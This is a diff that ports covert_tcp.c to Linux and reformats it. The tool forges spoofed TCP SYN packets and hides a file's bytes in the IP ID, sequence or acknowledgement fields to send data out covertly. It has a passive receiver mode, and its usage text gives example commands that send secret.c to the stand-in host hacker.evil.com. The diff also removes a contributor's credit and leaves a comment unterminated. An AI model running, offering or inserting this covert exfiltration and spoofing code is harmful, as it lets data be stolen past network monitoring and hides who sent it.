@@ -17,8 +17,7 @@
  *
  * compile: cc -o covert_tcp covert_tcp.c
  *
- * REVISION: This code has been modified by Steffen L. Norgren <ironix@trollop.org>
- *           to work on BSD-based systems.
+ *
  * 
  * Portions of this code based on ping.c (c) 1987 Regents of the 
  * University of California. (See function in_cksm() for details)
@@ -36,19 +35,19 @@
 #include <netinet/tcp.h>
 #include <sys/socket.h>
 #include <arpa/inet.h>
-#include <netinet/ip.h>
-/* #include <netinet/tcp.h> */
+#include <linux/ip.h>
+//#include <linux/tcp.h>
 
 #define VERSION "1.0"
 
 /* Prototypes */
-void forgepacket(unsigned int, unsigned int, unsigned short, unsigned short,
-				 char *,int,int,int,int); 
+void forgepacket(unsigned int, unsigned int, unsigned short, unsigned 
+                 short,char *,int,int,int,int); 
 unsigned short in_cksum(unsigned short *, int);
 unsigned int host_convert(char *);
 void usage(char *);
 
-int main(int argc, char **argv)
+main(int argc, char **argv)
 {
 	unsigned int source_host=0,dest_host=0;
 	unsigned short source_port=0,dest_port=80;
@@ -61,28 +60,34 @@ int main(int argc, char **argv)
 	printf("Not for commercial use without permission.\n");
 	
 	/* Can they run this? */
-	if(geteuid() !=0) {
+	if(geteuid() !=0)
+    {
 		printf("\nYou need to be root to run this.\n\n");
 		exit(0);
     }
 	
 	/* Tell them how to use this thing */
-	if((argc < 6) || (argc > 13)) {
+	if((argc < 6) || (argc > 13))
+	{
 		usage(argv[0]);
 		exit(0);
 	}
 	
 	/* No error checking on the args...next version :) */   
-	for(count=0; count < argc; ++count) {
-		if (strcmp(argv[count],"-dest") == 0) {
+	for(count=0; count < argc; ++count)
+    {
+		if (strcmp(argv[count],"-dest") == 0)
+		{
 			dest_host=host_convert(argv[count+1]); 
 			strncpy(desthost,argv[count+1],79);
 		}
-		else if (strcmp(argv[count],"-source") == 0) {
+		else if (strcmp(argv[count],"-source") == 0)
+		{
 			source_host=host_convert(argv[count+1]); 
 			strncpy(srchost,argv[count+1],79);
 		}
-		else if (strcmp(argv[count],"-file") == 0) {
+		else if (strcmp(argv[count],"-file") == 0)
+		{
 			strncpy(filename,argv[count+1],79);
 			file=1;
 		}
@@ -103,26 +108,32 @@ int main(int argc, char **argv)
 	/* check the encoding flags */
 	if(ipid+seq+ack == 0)
 		ipid=1; /* set default encode type if none given */
-	else if (ipid+seq+ack !=1) {
+	else if (ipid+seq+ack !=1)
+    {
 		printf("\n\nOnly one encoding/decode flag (-ipid -seq -ack) can be used at a time.\n\n");
 		exit(1);
     }
 	/* Did they give us a filename? */
-	if(file != 1) {
+	if(file != 1)
+    {
 		printf("\n\nYou need to supply a filename (-file <filename>)\n\n");
 		exit(1);
     }
 	
-	if(server==0) { /* if they want to be a client do this... */
-		if (source_host == 0 && dest_host == 0) {
+	if(server==0) /* if they want to be a client do this... */
+    {   
+		if (source_host == 0 && dest_host == 0)
+		{
 			printf("\n\nYou need to supply a source and destination address for client mode.\n\n");
 			exit(1);
 		}
-		else if (ack == 1) {
+		else if (ack == 1)
+		{
 			printf("\n\n-ack decoding can only be used in SERVER mode (-server)\n\n");
 			exit(1);
 		}
-		else {
+		else
+		{
 			printf("Destination Host: %s\n",desthost);
 			printf("Source Host     : %s\n",srchost);
 			if(source_port == 0)
@@ -138,8 +149,10 @@ int main(int argc, char **argv)
 			printf("\nClient Mode: Sending data.\n\n");
 		}
 	}
-    else { /* server mode it is */
-		if (source_host == 0 && source_port == 0) {
+    else /* server mode it is */
+	{    
+		if (source_host == 0 && source_port == 0)
+		{
 			printf("You need to supply a source address and/or source port for server mode.\n");
 			exit(1);
 		}
@@ -168,22 +181,26 @@ int main(int argc, char **argv)
 	exit(0);
 }
 
-void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned short source_port,
-				 unsigned short dest_port, char *filename, int server, int ipid, int seq, int ack) 
+void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned 
+				 short source_port, unsigned short dest_port, char *filename, int server, int ipid
+				 , int seq, int ack) 
 {
-	struct send_tcp {
+	struct send_tcp
+	{
 		struct iphdr ip;
 		struct tcphdr tcp;
 	} send_tcp;
 	
-	struct recv_tcp {
+	struct recv_tcp
+	{
 		struct iphdr ip;
 		struct tcphdr tcp;
 		char buffer[10000];
 	} recv_pkt;
 	
 	/* From synhose.c by knight */
-	struct pseudo_header {
+	struct pseudo_header
+	{
 		unsigned int source_address;
 		unsigned int dest_address;
 		unsigned char placeholder;
@@ -206,12 +223,15 @@ void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned shor
 	/* Client code        */
 	/**********************/
 	/* are we the client? */
-	if(server==0) {
-		if((input=fopen(filename,"rb"))== NULL) {
+	if(server==0)
+	{
+		if((input=fopen(filename,"rb"))== NULL)
+		{
 			printf("I cannot open the file %s for reading\n",filename);
 			exit(1);
 		}
-		else while((ch=fgetc(input)) !=EOF) {
+		else while((ch=fgetc(input)) !=EOF)
+		{
 			
 			/* Delay loop. This really slows things down, but is necessary to ensure */
 			/* semi-reliable transport of messages over the Internet and will not flood */
@@ -248,36 +268,45 @@ void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned shor
 			
 			/* begin forged TCP header */
 			if(source_port == 0) /* if the didn't supply a source port, we make one */
-				send_tcp.tcp.th_sport = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
+				send_tcp.tcp.source = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
 			else /* otherwise use the one given */
-				send_tcp.tcp.th_sport = htons(source_port);
+				send_tcp.tcp.source = htons(source_port);
 			
 			if(seq==0) /* if we are not encoding the value into the seq number */
-				send_tcp.tcp.th_seq = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
+				send_tcp.tcp.seq = 1+(int)(10000.0*rand()/(RAND_MAX+1.0));
 			else /* otherwise we'll hide the data using our cheesy algorithm one more time. */
-				send_tcp.tcp.th_seq = ch;
+				send_tcp.tcp.seq = ch;
 			
 			/* forge destination port */
-			send_tcp.tcp.th_dport = htons(dest_port);
+			send_tcp.tcp.dest = htons(dest_port);
 			
 			/* the rest of the flags */
 			/* NOTE: Other covert channels can use the following flags to encode data a BIT */
 			/* at a time. A good example would be the use of the PSH flag setting to either */
 			/* on or off and having the remote side decode the bytes accordingly... CHR */
-
-			send_tcp.tcp.th_win = htons(512);	/* checksum */
-			send_tcp.tcp.th_off = 5;			/* data offset */
-			send_tcp.tcp.th_ack = 0;			/* sequence number */
-			send_tcp.tcp.th_flags = TH_SYN;		/* setting SYN bit */
+			send_tcp.tcp.ack_seq = 0;
+			send_tcp.tcp.res1 = 0;
+			send_tcp.tcp.doff = 5;
+			send_tcp.tcp.fin = 0;
+			send_tcp.tcp.syn = 1;
+			send_tcp.tcp.rst = 0;
+			send_tcp.tcp.psh = 0;
+			send_tcp.tcp.ack = 0;
+			send_tcp.tcp.urg = 0;
+			send_tcp.tcp.res2 = 0;
+			send_tcp.tcp.window = htons(512);
+			send_tcp.tcp.check = 0;
+			send_tcp.tcp.urg_ptr = 0;
 			
 			/* Drop our forged data into the socket struct */
 			sin.sin_family = AF_INET;
-			sin.sin_port = send_tcp.tcp.th_sport;
+			sin.sin_port = send_tcp.tcp.source;
 			sin.sin_addr.s_addr = send_tcp.ip.daddr;   
 			
 			/* Now open the raw socket for sending */
 			send_socket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
-			if(send_socket < 0) {
+			if(send_socket < 0)
+			{
 				perror("send socket cannot be open. Are you root?");
 				exit(1);
 			}
@@ -295,7 +324,7 @@ void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned shor
 			
 			bcopy((char *)&send_tcp.tcp, (char *)&pseudo_header.tcp, 20);
 			/* Final checksum on the entire package */
-			send_tcp.tcp.th_sum = in_cksum((unsigned short *)&pseudo_header, 32);
+			send_tcp.tcp.check = in_cksum((unsigned short *)&pseudo_header, 32);
 			/* Away we go.... */
 			sendto(send_socket, &send_tcp, 40, 0, (struct sockaddr *)&sin, sizeof(sin));
 			printf("Sending Data: %c\n",ch);
@@ -310,8 +339,10 @@ void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned shor
 	/* Passive server code */
 	/***********************/
 	/* we are the server so now we listen */
-	else {
-		if((output=fopen(filename,"wb"))== NULL) {
+	else
+	{
+		if((output=fopen(filename,"wb"))== NULL)
+		{
 			printf("I cannot open the file %s for writing\n",filename);
 			exit(1);
 		}
@@ -319,10 +350,12 @@ void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned shor
 		/* reliability as UDP as we do not ACK the packets for retries if they are bad. */
 		/* This is just proof of concept... CHR*/
 		
-		while(1) { /* read packet loop */
+		while(1) /* read packet loop */
+		{
 			/* Open socket for reading */
 			recv_socket = socket(AF_INET, SOCK_RAW, 6);
-			if(recv_socket < 0) {
+			if(recv_socket < 0)
+			{
 				perror("receive socket cannot be open. Are you root?");
 				exit(1);
 			}
@@ -330,20 +363,23 @@ void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned shor
 			read(recv_socket, (struct recv_tcp *)&recv_pkt, 9999);
 			
 			/* if the packet has the SYN/ACK flag set and is from the right address..*/
-			if (source_port == 0) { /* the user does not care what port we come from */
-				/* check for SYN/ACK flag set and correct inbound IP source address */
-				if((recv_pkt.tcp.th_flags == TH_SYN) && (recv_pkt.ip.saddr == source_addr)) {
+			if (source_port == 0) /* the user does not care what port we come from */
+			{       /* check for SYN/ACK flag set and correct inbound IP source address */
+				if((recv_pkt.tcp.syn == 1) && (recv_pkt.ip.saddr == source_addr)) 
+				{
 					/* IP ID header "decoding" */
 					/* The ID number is converted from it's ASCII equivalent back to normal */
-					if(ipid==1) {
+					if(ipid==1)
+					{
 						printf("Receiving Data: %c\n",recv_pkt.ip.id);
 						fprintf(output,"%c",recv_pkt.ip.id);
 						fflush(output);
 					}
 					/* IP Sequence number "decoding" */
-					else if (seq==1) {
-						printf("Receiving Data: %c\n",recv_pkt.tcp.th_seq);
-						fprintf(output,"%c",recv_pkt.tcp.th_seq); 
+					else if (seq==1)
+					{
+						printf("Receiving Data: %c\n",recv_pkt.tcp.seq);
+						fprintf(output,"%c",recv_pkt.tcp.seq); 
 						fflush(output);
 					}
 					/* Use a bounced packet from a remote server to decode the data */
@@ -366,7 +402,8 @@ void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned shor
 					/* plus one (ISN+1). However, the translation here drops some of the */
 					/* bits so we get the original ASCII value...go figure.. */
 					
-					else if (ack==1) {
+					else if (ack==1)
+					{
 						printf("Receiving Data: %c\n",recv_pkt.tcp.ack_seq);
 						fprintf(output,"%c",recv_pkt.tcp.ack_seq); 
 						fflush(output);
@@ -377,24 +414,28 @@ void forgepacket(unsigned int source_addr, unsigned int dest_addr, unsigned shor
 			/* if the packet has the SYN/ACK flag set and is destined to the right port..*/
 			/* we'll grab it regardless if IP addresses. This is useful for bouncing off of */
 			/* multiple hosts to a single server address */
-			else {
-				if((recv_pkt.tcp.th_flags == TH_SYN)
-						&& (ntohs(recv_pkt.tcp.th_dport) == source_port)) {
+			else
+			{
+				if((recv_pkt.tcp.syn==1) && (ntohs(recv_pkt.tcp.dest) == source_port)) 
+				{
 					/* IP ID header "decoding" */
 					/* The ID number is converted from it's ASCII equivalent back to normal */
-					if(ipid==1)	{
+					if(ipid==1)
+					{
 						printf("Receiving Data: %c\n",recv_pkt.ip.id);
 						fprintf(output,"%c",recv_pkt.ip.id);
 						fflush(output);
 					}
 					/* IP Sequence number "decoding" */
-					else if (seq==1) {
-						printf("Receiving Data: %c\n",recv_pkt.tcp.th_seq);
-						fprintf(output,"%c",recv_pkt.tcp.th_seq); 
+					else if (seq==1)
+					{
+						printf("Receiving Data: %c\n",recv_pkt.tcp.seq);
+						fprintf(output,"%c",recv_pkt.tcp.seq); 
 						fflush(output);
 					}
 					/* Do the bounce decode again... */
-					else if (ack==1) {
+					else if (ack==1)
+					{
 						printf("Receiving Data: %c\n",recv_pkt.tcp.ack_seq);
 						fprintf(output,"%c",recv_pkt.tcp.ack_seq); 
 						fflush(output);
@@ -436,7 +477,8 @@ unsigned short in_cksum(unsigned short *ptr, int nbytes)
 	u_short			oddbyte;
 	register u_short	answer;		/* assumes u_short == 16 bits */
 	
-	/* Our algorithm is simple, using a 32-bit accumulator (sum),
+	/*
+	 * Our algorithm is simple, using a 32-bit accumulator (sum),
 	 * we add sequential 16-bit words to it, and at the end, fold back
 	 * all the carry bits from the top 16 bits into the lower 16 bits.
 	 */
@@ -454,24 +496,29 @@ unsigned short in_cksum(unsigned short *ptr, int nbytes)
 		sum += oddbyte;
 	}
 	
-	/* Add back carry outs from top 16 bits to low 16 bits. */
+	/*
+	 * Add back carry outs from top 16 bits to low 16 bits.
+	 */
+	
 	sum  = (sum >> 16) + (sum & 0xffff);	/* add high-16 to low-16 */
 	sum += (sum >> 16);			/* add carry */
 	answer = ~sum;		/* ones-complement, then truncate to 16 bits */
 	return(answer);
-} /* end in_cksm() */
+} /* end in_cksm()
    
    
    
-/* Generic resolver from unknown source */
+   /* Generic resolver from unknown source */
 unsigned int host_convert(char *hostname)
 {
 	static struct in_addr i;
 	struct hostent *h;
 	i.s_addr = inet_addr(hostname);
-	if(i.s_addr == -1) {
+	if(i.s_addr == -1)
+	{
 		h = gethostbyname(hostname);
-		if(h == NULL) {
+		if(h == NULL)
+		{
 			fprintf(stderr, "cannot resolve %s\n", hostname);
 			exit(0);
 		}
@@ -483,8 +530,7 @@ unsigned int host_convert(char *hostname)
 /* Tell them how to use this */
 void usage(char *progname)
 {
-	printf("Covert TCP usage: \n%s -dest dest_ip -source source_ip -file filename \
-			-source_port port -dest_port port -server [encode type]\n\n", progname);
+	printf("Covert TCP usage: \n%s -dest dest_ip -source source_ip -file filename -source_port port -dest_port port -server [encode type]\n\n", progname);
 	printf("-dest dest_ip      - Host to send data to.\n");
 	printf("-source source_ip  - Host where you want the data to originate from.\n");
 	printf("                     In SERVER mode this is the host data will\n");
@@ -505,14 +551,18 @@ void usage(char *progname)
 	printf("        server using -seq. See documentation for details\n");
 	printf("\nPress ENTER for examples.");
 	getchar();
-	printf("\nExample: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com \
-			-source_port 1234 -dest_port 80 -file secret.c\n\n");
+	printf("\nExample: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com -source_port 1234 -dest_port 80 -file secret.c\n\n");
 	printf("Above sends the file secret.c to the host hacker.evil.com a byte \n");
 	printf("at a time using the default IP packet ID encoding.\n");
-	printf("\nExample: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com \
-			-dest_port 80 -server -file secret.c\n\n");
+	printf("\nExample: \ncovert_tcp -dest foo.bar.com -source hacker.evil.com -dest_port 80 -server -file secret.c\n\n");
 	printf("Above listens passively for packets from  hacker.evil.com\n");
 	printf("destined for port 80. It takes the data and saves the file locally\n");
 	printf("as secret.c\n\n");
 	exit(0);
 } /* end usage() */
+
+
+/* The End */
+
+
+
